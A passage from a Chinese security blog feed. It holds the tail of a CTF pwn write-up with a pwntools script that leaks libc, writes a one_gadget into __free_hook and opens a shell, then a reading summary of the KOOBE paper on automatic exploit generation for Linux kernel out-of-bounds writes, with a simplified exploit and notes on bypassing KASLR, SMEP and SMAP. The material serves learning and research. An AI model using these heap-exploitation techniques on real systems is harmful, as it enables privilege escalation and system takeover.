class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,msg)</span>:</span></span><br><span class="line">    sl(<span class="string">"Choice:"</span>,<span class="string">"4"</span>)</span><br><span class="line">    sl(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line">    sl(<span class="string">"Message:"</span>,msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">super_buy</span><span class="params">(name)</span>:</span></span><br><span class="line">    sl(<span class="string">"Choice:"</span>,<span class="string">"6"</span>)</span><br><span class="line">    sl(<span class="string">"name:"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_more</span><span class="params">(idx,msg)</span>:</span></span><br><span class="line">    sl(<span class="string">"Choice:"</span>,<span class="string">"7"</span>)</span><br><span class="line">    sl(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line">    s(<span class="string">"Message:"</span>,msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">show(<span class="number">-5</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">data_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">p.recv(<span class="number">16</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x1eb6a0</span></span><br><span class="line">log.success(<span class="string">"data_addr:"</span>+hex(data_addr))</span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x10afa9</span></span><br><span class="line">log.success(<span class="string">"free_hook:"</span>+hex(free_hook))</span><br><span class="line">log.success(<span class="string">"one_gadget:"</span>+hex(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment">#set onegadget in __free_hook</span></span><br><span class="line">edit(<span class="number">-5</span>,p64(data_addr)+p64(<span class="number">0x1000000</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">edit(<span class="number">-5</span>,p64(data_addr)+p64(<span class="number">0x1000000</span>)+<span class="string">'\x01'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit_more(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x58</span>+p64(<span class="number">0x61</span>)+p64(free_hook))</span><br><span class="line">super_buy(<span class="string">"kangel"</span>)</span><br><span class="line">pay = p64(data_addr) + p64(<span class="number">0x1000000</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(libc_base+<span class="number">0x1eb6a0</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(libc_base+<span class="number">0x1ea980</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(libc_base+<span class="number">0x1eb5c0</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">edit(<span class="number">-5</span>,pay)</span><br><span class="line">super_buy(p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h4><p>可以利用乘法溢出修改money</p><p>使用mmap进行calloc时，不会进行memset，因此可以泄露libc</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;比赛没时间打，赛后复现几道题目玩玩。&lt;/p&gt;
&lt;h3 id=&quot;no-write&quot;&gt;&lt;a href=&quot;#no-write&quot; class=&quot;he
      
    
    </summary>
    
      <category term="pwn学习" scheme="https://j-kangel.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>论文阅读之KOOBE</title>
    <link href="https://j-kangel.github.io/2020/05/18/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E4%B9%8BKOOBE/"/>
    <id>https://j-kangel.github.io/2020/05/18/论文阅读之KOOBE/</id>
    <published>2020-05-18T12:34:22.000Z</published>
    <updated>2020-05-23T09:41:50.524Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>题目：<strong>KOOBE: Towards Facilitating Exploit Generation of Kernel Out-Of-BoundsWrite Vulnerabilities</strong></p><p>会议：<strong>USENIX Security ‘20 Summer Quarter Accepted Papers</strong></p><p>链接：<a href="https://www.usenix.org/conference/usenixsecurity20/presentation/chen-weiteng" target="_blank" rel="noopener">https://www.usenix.org/conference/usenixsecurity20/presentation/chen-weiteng</a></p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>KOOBE：Kernel Out-Of-Bound Exploit（内核越界漏洞利用），本文研究的是内核堆内存的越界。</p><p>内核保护着操作系统的基础架构，不幸的是，一些内核例如linux内核是用C写的，由于C语言自身的属性会导致一些内存相关漏洞频发。</p><p>2006-2018：已修复的安全bug中70%与内存相关。攻击者可以利用这些漏洞进行提权进而获取整个系统的控制权。</p><p>syzbot：<a href="https://syzkaller.appspot.com/upstream，Linux内核fuzzing的bug显示。" target="_blank" rel="noopener">https://syzkaller.appspot.com/upstream，Linux内核fuzzing的bug显示。</a></p><p>2017.8-2018.9：1216个linux内核漏洞被 syzkaller 发现，平均每天3.42个。毫无疑问会给开发者带来很大的工作量。而这些漏洞有些可以很容易提权，有些则无足轻重，因此需要将这些分开，即给这些bug设定优先级。其中一个办法是利用PoC自动生成一般的内存漏洞利用脚本从而对这些可以利用的漏洞进行评估。当然，内核漏洞不止一种，可以分而治之，UAF漏洞的工作已经有了一定的成果（Fuze），本文研究的是OOB。</p><p>OOB：内核越界访问，本文研究的是内核堆内存</p><p>挑战：不同的OOB所表现的利用能力(Capability)不同。PoC不能展示所有的漏洞。</p><p>Capability: how far, how many, what value</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CVE-2016-6187 can overwrite only one single byte(off by one)</span><br><span class="line">CVE-2017-7184 can write more bytes but only the same fixed value</span><br></pre></td></tr></table></figure><p>内存属性：函数指针，结构体指针，具体的值等等</p><p>本文主要工作：给OOB漏洞分级，自动生成Expliot（AEG）</p><p>本文主要贡献：</p><ol><li>KOOBE可以提取OOB这一类型漏洞的Capability</li><li>代码开源(<a href="https://github.com/seclab-ucr/KOOBE)，可供研究" target="_blank" rel="noopener">https://github.com/seclab-ucr/KOOBE)，可供研究</a></li><li>测试了已知CVE和syzbot上的bug，证明了有效性，有助于开发exploit</li></ol><h3 id="范围和假设"><a href="#范围和假设" class="headerlink" title="范围和假设"></a>范围和假设</h3><h4 id="研究范围"><a href="#研究范围" class="headerlink" title="研究范围"></a>研究范围</h4><p>AEG（Automatic exploit generation）在linux内核的应用具有挑战性。KOOBE专注于性能提取(capability ex-traction )和漏洞评估( exploitability evaluation),这是本文开发堆OOB漏洞的Exploit的关键步骤。给定PoC，触发一个或多个OOB访问，KOOBE生成Exploit从而达到指令指针（IP）劫持。</p><h4 id="假设-攻击模型"><a href="#假设-攻击模型" class="headerlink" title="假设(攻击模型)"></a>假设(攻击模型)</h4><p>内核被常用的保护机制所保护。</p><p>KASLR：Kernel Address Space Layout Randomization(内核地址空间布局随机化)</p><p>SMEP： Supervisor Mode Execution Prevention，禁止内核执行用户空间代码</p><p>SMAP： Supervisor  Mode  Access  Prevention，禁止内核访问用户空间</p><p>当我们劫持IP之后，这些都可以绕过。</p><p>ret2dir：Rethinking kernel isolation，可以绕过SMEP和SMAP</p><p>From collision to exploitation: Unleashing use-after-free vulnerabilitiesin linux kernel</p><p>KEPLER ：无条件地自动将IP控制转化为任意代码执行。</p><h3 id="背景和示例"><a href="#背景和示例" class="headerlink" title="背景和示例"></a>背景和示例</h3><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>内核OOB漏洞的危害性巨大，实际中内核OOB的研究是一项劳动密集型任务，手动分析花费很多精力还不一定奏效，接下来通过实例详细描述一下OOB漏洞。</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>CVE-2018-5703：Linux Kernel 4.14.0 ,简化如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  <span class="class"><span class="keyword">struct</span> <span class="title">Type1</span> &#123;</span> ...;                               &#125;;</span><br><span class="line"><span class="number">2.</span>  <span class="class"><span class="keyword">struct</span> <span class="title">Type2</span> &#123;</span> Type1 sk; <span class="keyword">uint64_t</span> option; ...;    &#125;;</span><br><span class="line"><span class="number">3.</span>  <span class="class"><span class="keyword">struct</span> <span class="title">Type3</span> &#123;</span> <span class="keyword">int</span> (*ptr)(); ...;                 &#125;;</span><br><span class="line"><span class="number">4.</span>  <span class="class"><span class="keyword">struct</span> <span class="title">Type4</span> &#123;</span> <span class="keyword">uint64_t</span> state;  Type3 *sk; ...;   &#125;;</span><br><span class="line"><span class="number">5.</span>  <span class="class"><span class="keyword">struct</span> <span class="title">Type5</span> &#123;</span> <span class="keyword">atomic_t</span> refcnt; ...;              &#125;;</span><br><span class="line"><span class="number">6.</span>  Type2 gsock = &#123; ..., .option = <span class="number">0x08080000000000</span>,  &#125;;</span><br><span class="line"><span class="number">7.</span>  Type1 * vul = <span class="literal">NULL</span>; Type3 * tgt = <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">8.</span>  <span class="function"><span class="keyword">void</span> <span class="title">sys_socket</span><span class="params">()</span>  <span class="comment">//sizeof(Type1) == sizeof(Type3)</span></span></span><br><span class="line">9.    vul = kmalloc(sizeof(Type1))</span><br><span class="line"><span class="number">10.</span> <span class="function"><span class="keyword">void</span> <span class="title">sys_accept</span><span class="params">()</span></span></span><br><span class="line">11.   vul = (Type2*)vul;          //type confusion</span><br><span class="line"><span class="number">12.</span>   vul-&gt;option = gsock.option; <span class="comment">//Vulnerability Point</span></span><br><span class="line"><span class="number">13.</span> <span class="function"><span class="keyword">void</span> <span class="title">sys_setsockopt</span><span class="params">(val)</span> <span class="comment">//not invoked in given PoC</span></span></span><br><span class="line">14.   if (val == -1) return;</span><br><span class="line"><span class="number">15.</span>   gsock.option = val;</span><br><span class="line"><span class="number">16.</span> <span class="function"><span class="keyword">void</span> <span class="title">sys_create_tgt</span><span class="params">()</span></span></span><br><span class="line">17.   tgt = kmalloc(sizeof(Type3)); </span><br><span class="line"><span class="number">18.</span>   tgt-&gt;ptr = <span class="literal">NULL</span>;           <span class="comment">//init ptr</span></span><br><span class="line"><span class="number">19.</span> <span class="function"><span class="keyword">void</span> <span class="title">sys_deref</span><span class="params">()</span> </span>&#123; <span class="keyword">if</span> (tgt-&gt;ptr) tgt-&gt;ptr(); &#125;</span><br></pre></td></tr></table></figure><p>漏洞点：line 12，使用ＫＡＳＡＮ发现</p><p>vulnerable object: 漏洞点</p><p>target object: OOB区域</p><p>漏洞形成: line 11 -&gt; line 12</p><p>咋一看: 好像只能越界写0x08080000000000, 该地址既不属于内核空间也不属于用户空间</p><p>再一看: 如果sys_setsockopt()被调用,则可以写任意值(PoC中并未提及,限制漏洞的可利用性, 无公开Exploit)</p><p>实际情况: 该漏洞没有公开的exploit,大概是fuzzing发现了咋一看的bug就没有继续进行下去。再一看的漏洞正是本文的KOOBE发现的,并自动生成了可以利用的exploit, 下一章的第三节会详细讲述如何发现的。</p><p>exploit简化如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line"><span class="number">2.</span>    sys_create_tgt(); <span class="comment">// cache exhaustion </span></span><br><span class="line"><span class="number">3.</span>  sys_socket();       <span class="comment">// vuln obj</span></span><br><span class="line"><span class="number">4.</span>  sys_create_tgt();   <span class="comment">// target obj</span></span><br><span class="line"><span class="number">5.</span> sys_setsockopt(<span class="number">0xdeadbeef</span>);    </span><br><span class="line"><span class="number">6.</span>  sys_accept();       <span class="comment">// tgt-&gt;ptr = 0xdeadbeef</span></span><br><span class="line"><span class="number">7.</span>  sys_deref()</span><br></pre></td></tr></table></figure><p>利用过程分为四步:</p><p><img alt="image-20200518175655179" style="zoom: 50%;" data-src="/2020/05/18/论文阅读之KOOBE/image-20200518175655179.png" class="lazyload"></p><h5 id="性能概要"><a href="#性能概要" class="headerlink" title="性能概要"></a>性能概要</h5><p>大部分的漏洞是Fuzzing发现，该漏洞的PoC可以破坏一些内存但是还没达到可利用的层次。因此，此时该漏洞的性能等级较低。KOOBE首先会根据PoC进行性能探测(计算当前性能和探测更高级的性能)。</p><h5 id="堆风水"><a href="#堆风水" class="headerlink" title="堆风水"></a>堆风水</h5><p>Linux内核使用的是 slab/slub 分配器，根据size分配相匹配大小的chunk(相同的size所分配的chunk大小相同，例如type1和type3)。被释放的chunk会在堆cache中,因此为了是vulnerable object和target object相邻，首先通过堆喷将堆cache中的内存耗尽。见exploit line1-4。</p><h5 id="选择目标对象-target-object"><a href="#选择目标对象-target-object" class="headerlink" title="选择目标对象(target object)"></a>选择目标对象(target object)</h5><p>通过前面的性能概要发现更高级的漏洞，并且布置好了堆内存。下面就需要选择攻击的目标并且写好payload，通常我们可以把攻击目标分成几种:</p><ol><li><p>函数指针，见type3，可以直接控制程序流</p></li><li><p>数据指针，见type4，可以覆写结构体</p></li><li><p>非指针:需要具体讨论</p><ul><li>uid，写成0直接提权</li><li>reference counter: 减少可以造成UAF，见type5</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reference counter机制</span><br><span class="line">一个对象可以有多个owner，该计数器保存了程序中该对象有几个owner的信息。</span><br><span class="line">当对该实例的reference counter变为0，也就是没有owner时，dealloc将被调用，以释放该实例内存。</span><br></pre></td></tr></table></figure></li></ol><p>这里选择type3，size同vulnerable object。由此看来，收集不同的target object是很有必要的。</p><p>例如:CVE-2016-6778</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">example1</span><span class="params">(size)</span></span></span><br><span class="line"><span class="function">vul </span>= kmalloc(size);</span><br><span class="line">vul[size] = ’\<span class="number">0</span>’;</span><br></pre></td></tr></table></figure><p>明显的off by null漏洞,，这时候如果target object为函数指针就没无法像上面一样控制整个指针，这时候选择RC作为target object就比较合适，因为低字节清零一般会减少RC的值从而使该内存提前释放造成UAF。</p><p>在Linux内核中，可以找到2000多个潜在的target object。收集这些object将有助于自动生成exploit。</p><h5 id="exploit合成"><a href="#exploit合成" class="headerlink" title="exploit合成"></a>exploit合成</h5><p>基于target object调整PoC进而合成exploit。在这个过程，,我们需要绕过高级检测来达到任意代码执行。</p><p>类似KASLR、SMAP、SMEP只会让攻击复杂化而不能完全防止攻击。下面简要介绍这三种防护的绕过：</p><p>KASLR：信息泄露</p><p>SMEP：ROP/JOP</p><p>SMAP：physmap spray，用户空间内存映射到physmap，内核可直接访问physmap</p><p>最后利用KEPLER把IP劫持转化成任意代码执行。</p><p>KEPLER: Facilitating control-flow hijacking primitive eval-uation for linux kernel vulnerabilities</p><h3 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h3><p>we  describe  the overview of KOOBE, a novel framework to extract the capabilities of heap OOB-based vulnerabilities and assess their exploitability.</p><p><img alt="image-20200518194836602" data-src="/2020/05/18/论文阅读之KOOBE/image-20200518194836602.png" class="lazyload"></p><p>首先进行漏洞分析，利用符号跟踪(symbolic tracing)来总结PoC的性能(capability)，然后利用一个或更多的target object来自动确定是否可以利用，如果不能，将触发性能探测(Capability Exploration)来发现新的PoC，然后对新PoC进行分析，直到找到可利用的target object或者timeout。最后利用PoC生成exploit。</p><h4 id="漏洞分析-Vulnerable-Analysis"><a href="#漏洞分析-Vulnerable-Analysis" class="headerlink" title="漏洞分析(Vulnerable Analysis)"></a>漏洞分析(Vulnerable Analysis)</h4><p>给定PoC，KOOBE尝试发现漏洞点(OOB访问处)以及相应的漏洞对象，如下所示</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123; “vuln_obj”: &#123;    </span><br><span class="line">    “size”: 256, // Concrete value of the size    </span><br><span class="line">     // The address of the function call allocating the object    </span><br><span class="line">    “callsite”: 0xffffffff811f18d0 &#125;,  </span><br><span class="line"> “KASAN reports”: [&#123;      </span><br><span class="line"> // call chain to the KASAN report function      </span><br><span class="line"> “backtrace”: [0xffffffff814b56a6, 0xffffffff81477763],      </span><br><span class="line">“length”: 1  </span><br><span class="line">&#125;]&#125;</span><br></pre></td></tr></table></figure><p>KASAN： Kernel Address Sanitizer 的缩写，它是一个动态检测内存错误的工具，主要功能是检查内存越界访问和使用已释放的内存等问题。KASAN可以检测的内存异常包括：slab-out-of-bounds/user-after-free/stack-out-of-bounds/global-out-of-bounds等。基于影子内存(shadow memory)和红色区域(red zones)<br><img alt="" data-src="/2020/05/18/论文阅读之KOOBE/1.png" class="lazyload"></p><p>缺陷：</p><ol><li>无法提供所有的OOB，例如，OOB 访问绿色区域。</li><li>无法准确指出漏洞对象，大部分都指在红色区域</li></ol><p>KOOBE方案：符号追踪结合KASAN，例如： CVE-2017-7184</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">example2</span><span class="params">(i)</span>  </span></span><br><span class="line"><span class="function">vul </span>= (<span class="keyword">char</span>*)kmalloc(<span class="keyword">sizeof</span>(TYPE));  <span class="comment">//omit other OOB points on the path  </span></span><br><span class="line">vul[i/<span class="number">8</span>] |= <span class="number">1</span>&lt;&lt;(i&amp;<span class="number">0x7</span>);<span class="comment">//set 1 bit</span></span><br></pre></td></tr></table></figure><p>将vul和i都进行符号化，分析符号表达式vul+i/8有可能大于sizeof(TYPE)并且i没有约束时可以确定这是一个漏洞点。</p><h4 id="性能概要-Capability-Summarization"><a href="#性能概要-Capability-Summarization" class="headerlink" title="性能概要(Capability Summarization)"></a>性能概要(Capability Summarization)</h4><p>Capability：在本文中，capability表示OOB写的能力，为了量化它，本文做出以下定义：</p><h5 id="Definition-1-OOB-write-set"><a href="#Definition-1-OOB-write-set" class="headerlink" title="Definition 1 OOB write set"></a>Definition 1 OOB write set</h5><p>E：符号执行引擎所支持的所有符号表达式</p><p>P：所有路径</p><p>Np：可以触发漏洞的路径</p><p>Tp={(offpi,lenpi,valpi)|i∈Np∧off,len,val∈E}：OOB可写集</p><p>off：how far</p><p>len：how many</p><p>val：what value</p><p>Tpi：OOB可写集的个例</p><p>for循环：抽象成一次OOB write</p><h5 id="Definition-2-Capability"><a href="#Definition-2-Capability" class="headerlink" title="Definition 2 Capability"></a>Definition 2 Capability</h5><p>Cp={sizep,Tp,f(p)|sizep∈E}：路径p的性能</p><p>size：漏洞对象的大小，size的大小有关target object的个数</p><p>f(p):：执行时p的路径约束,例如：line 14 -&gt; line 15</p><p>In the motivating example, the capability corresponding tothe original PoC can be expressed as:</p><p>Corig={sizeof(Type1),{(offsetof(Type2,option),8,0x08080000000000)},/0}(1)</p><p>while the complete capability should be:</p><p>Ccomp={sizeof(Type1),{(offsetof(Type2,option),8,val)},{val!=−1}}(2)</p><p>when ‘sys_setsockopt’ is invoked before triggering the vul-nerability point.</p><h5 id="Definition-3-Capability-Comparison"><a href="#Definition-3-Capability-Comparison" class="headerlink" title="Definition 3 Capability Comparison"></a>Definition 3 Capability Comparison</h5><p>∀e1,e2∈E, e1&lt;=e2 if e1 is identical to e2 or e1is a constant whose value can be taken in e2</p><p>∀p1,p2∈P, Tp1i&lt;=Tp2i if offp1i&lt;=offp2i ∧ lenp1i&lt;=lenp2i ∧ valp1i&lt;=valp2i</p><p>∀p1,p2∈P, Cp1&lt;=Cp2 if sizep1&lt;=sizep2 ∧ ∀i∈Np1 Tp1i&lt;=Tp2i</p><p>因此：Corig &lt; Ccomp</p><h5 id="Capability-Generation"><a href="#Capability-Generation" class="headerlink" title="Capability Generation"></a>Capability Generation</h5><p>函数调用：例如memcpy，解决循环问题</p><p>直接访问</p><p>memcpy(a1,a2,a3)</p><p>a1：目的地址，提取出off</p><p>a2：源地址，提取出al</p><p>a3：长度，作为len</p><h4 id="性能探测-Capability-Exploration"><a href="#性能探测-Capability-Exploration" class="headerlink" title="性能探测(Capability Exploration)"></a>性能探测(Capability Exploration)</h4><p>通常，一个漏洞在不同的出发路径上有不同的漏洞点，不同的漏洞点有不同的性能。甚至不同路径触发的相同漏洞点也有不同的性能（如示例）。一般的PoC只有一条触发路径，因此我们需要触发新的路径来扩展性能或者产生新的性能。本文提出一种 capability-guided fuzzing方案来探索新的性能。</p><h5 id="Capability-Guided-Fuzzing"><a href="#Capability-Guided-Fuzzing" class="headerlink" title="Capability-Guided  Fuzzing"></a>Capability-Guided  Fuzzing</h5><p> Syzkaller ：基于覆盖反馈，探索新路径而无法探索新性能</p><p>输入：PoC，Cp</p><p>方法：突变种子，在覆盖反馈的同时计算Cp，并利用Cp进行反馈(触发OOB)</p><p>重点：种子过滤。例如：当value任意时，其它只关于value的种子可以丢弃。</p><h4 id="可利用性评估-Exploitability-Evacuation"><a href="#可利用性评估-Exploitability-Evacuation" class="headerlink" title="可利用性评估(Exploitability Evacuation)"></a>可利用性评估(Exploitability Evacuation)</h4><p>目标约束：target object可以利用的条件，例如：指针必须指向有效地址空间，target object的大小等于vulnerable object 如果利用堆风水(不是必须，为了稳定)。</p><p>然后把目标约束和Cp丢进约束求解器进行求解，无解则换下一个目标。具体过程如下：</p><p><img alt="image-20200519202330625" style="zoom:50%;" data-src="/2020/05/18/论文阅读之KOOBE/image-20200519202330625.png" class="lazyload"></p><p>示例的可利用性评估如下：</p><p><img alt="image-20200519202920748" style="zoom:50%;" data-src="/2020/05/18/论文阅读之KOOBE/image-20200519202920748.png" class="lazyload"></p><h5 id="性能构成"><a href="#性能构成" class="headerlink" title="性能构成"></a>性能构成</h5><p>同一性能可以重复利用，如CVE-2017-7184，一个OOB可能有多个性能，解决方案-贪心算法，具体如下：</p><p><img alt="image-20200519205742821" style="zoom:50%;" data-src="/2020/05/18/论文阅读之KOOBE/image-20200519205742821.png" class="lazyload"></p><p>相关定义：</p><p><img alt="image-20200519205639204" style="zoom:50%;" data-src="/2020/05/18/论文阅读之KOOBE/image-20200519205639204.png" class="lazyload"></p><h4 id="可利用基元生成-Exploit-Primitive-Synthesis"><a href="#可利用基元生成-Exploit-Primitive-Synthesis" class="headerlink" title="可利用基元生成(Exploit Primitive Synthesis)"></a>可利用基元生成(Exploit Primitive Synthesis)</h4><p>堆喷，堆风水</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>Syskaller：内核fuzz，主要用在性能探测和利用脚本生成</p><p>S2E：二进制符号执行框架，主要用在性能概要和可利用性评估</p><p>angr：二进制符号执行分析引擎，主要用在漏洞分析</p><p>细节如下：</p><h4 id="动态插桩来实现-Capability-Guided-Fuzzing"><a href="#动态插桩来实现-Capability-Guided-Fuzzing" class="headerlink" title="动态插桩来实现 Capability-Guided Fuzzing"></a>动态插桩来实现 Capability-Guided Fuzzing</h4><p>利用QEMU模式的Syskaller和S2E来进行CGF，Syskaller可以监测内核的内部状态而进行non-crashing fuzzing，避免KASAN的警告来保证持续fuzz（跳过但是记录导致OOB的指令）。缺点是这样可能产生误报导致一些假阳性的漏洞点或者性能。</p><h4 id="可支持的符号长度"><a href="#可支持的符号长度" class="headerlink" title="可支持的符号长度"></a>可支持的符号长度</h4><p>在可利用性评估中，我们主要考虑三个参数off，len，value并且将它们符号化。相较于符号索引来说，符号执行引擎对符号长度的支持不太友好。</p><p>解决方案：利用KLEE和Z3对长度进行迭代约束求解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i in [0, 10]:</span><br><span class="line">M[ite(i &lt;len, i+off, offsetdummy)] =val[i]</span><br><span class="line">其中ite表示if-then-else</span><br></pre></td></tr></table></figure><h4 id="循环中的性能提取"><a href="#循环中的性能提取" class="headerlink" title="循环中的性能提取"></a>循环中的性能提取</h4><p>循环会将阻塞符号执行(fuzzification好像有利用这个方法来阻塞DTA)，因为隐式数据流。</p><p>SAGE：循环引导和模式匹配</p><p>Angr：静态分析</p><h4 id="处理符号索引和循环边界来解决路径冲突"><a href="#处理符号索引和循环边界来解决路径冲突" class="headerlink" title="处理符号索引和循环边界来解决路径冲突"></a>处理符号索引和循环边界来解决路径冲突</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">(n)</span><span class="comment">//n = 64</span></span></span><br><span class="line">2.   vul = (char*)kmalloc(32);</span><br><span class="line"><span class="number">3.</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="number">4.</span>     vul[i] = <span class="number">0</span>;<span class="comment">//OOB Point</span></span><br></pre></td></tr></table></figure><p>处理方案：消除不必要的约束</p><h4 id="松懈不必要的约束"><a href="#松懈不必要的约束" class="headerlink" title="松懈不必要的约束"></a>松懈不必要的约束</h4><p>由于内核的复杂性，复杂的路径约束通常导致约束求解器无法再timeout前完成求解。一些无关的约束可以被松懈或直接忽略。</p><h4 id="目标收集"><a href="#目标收集" class="headerlink" title="目标收集"></a>目标收集</h4><p>总共收集2615个目标</p><h3 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h3><p>数据集：7个CVE+10个Syzbot bug</p><p>Ubuntu 16.04 、16G RAM 、Intel(R) Core i7-7700K CPU @ 4.20GHz* 8.</p><h4 id="IP劫持基元-IP-Hijacking-Primitives"><a href="#IP劫持基元-IP-Hijacking-Primitives" class="headerlink" title="IP劫持基元(IP-Hijacking Primitives)"></a>IP劫持基元(IP-Hijacking Primitives)</h4><p><img alt="image-20200519214951103" style="zoom:50%;" data-src="/2020/05/18/论文阅读之KOOBE/image-20200519214951103.png" class="lazyload"></p><p>EXP：19 ：5，6个新增，其中4个非CVE</p><h4 id="约束松懈-Constraint-Relaxation"><a href="#约束松懈-Constraint-Relaxation" class="headerlink" title="约束松懈(Constraint Relaxation)"></a>约束松懈(Constraint Relaxation)</h4><p><img alt="image-20200519220243790" style="zoom:50%;" data-src="/2020/05/18/论文阅读之KOOBE/image-20200519220243790.png" class="lazyload"></p><h4 id="实例学习-Case-Studies"><a href="#实例学习-Case-Studies" class="headerlink" title="实例学习(Case Studies)"></a>实例学习(Case Studies)</h4><h4 id="时间消耗-Time-Cost"><a href="#时间消耗-Time-Cost" class="headerlink" title="时间消耗(Time Cost)"></a>时间消耗(Time Cost)</h4><h3 id="讨论和未来工作"><a href="#讨论和未来工作" class="headerlink" title="讨论和未来工作"></a>讨论和未来工作</h3><ol><li>本文讨论的时OOB，可以扩展到其他类型的漏洞</li><li>KOOBE还可以继续优化</li></ol><h3 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h3><h4 id="漏洞点发现"><a href="#漏洞点发现" class="headerlink" title="漏洞点发现"></a>漏洞点发现</h4><p>动态内存防护措施：KASAN，Valgrind，ASan，MSan等</p><p>解决方案 ：结合KASAN和符号追踪(污点跟踪和内存探测的超集)</p><h4 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h4><p>基于覆盖反馈：AFL，Syzkaller，Honggfuzz</p><p>结合静态和动态分析的覆盖反馈：Vuzzer</p><p>基于梯度下降搜索： Angora</p><p>类神经网络：Neuzz</p><p>输入状态：Redqueen</p><p>Revery: From proof-of-concept toexploitable</p><h4 id="AEG"><a href="#AEG" class="headerlink" title="AEG"></a>AEG</h4><p>相关技术：符号执行以及混合符号执行</p><p>用户程序：</p><p>APEG：Automatic patch-based exploit genera-tion is possible: Techniques and implications</p><p>Automatic generation  of control flowhijacking exploits for software 